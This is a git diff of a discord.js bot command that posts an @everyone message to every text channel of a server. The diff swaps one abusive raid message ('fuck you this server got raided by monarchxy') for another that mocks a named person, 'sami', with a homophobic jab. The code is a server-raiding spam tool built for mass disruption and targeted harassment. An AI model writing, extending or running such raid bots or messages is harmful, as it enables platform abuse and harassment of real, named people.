@@ -1,7 +1,7 @@
 const { PermissionFlagsBits } = require("discord.js");
 
 module.exports = {
-    name: "fuck",
+    name: "fuh",
     description: "Send a message in every text channel.",
 
     async execute(client, message) {
@@ -22,7 +22,7 @@ module.exports = {
             try {
 
                 await channel.send({
-                    content: "@everyone fuck you this server got raided by monarchxy"
+                    content: "@everyone stay alery sami is a gay and he is a tail chatai buisness man"
                 });
 
                 sent++;
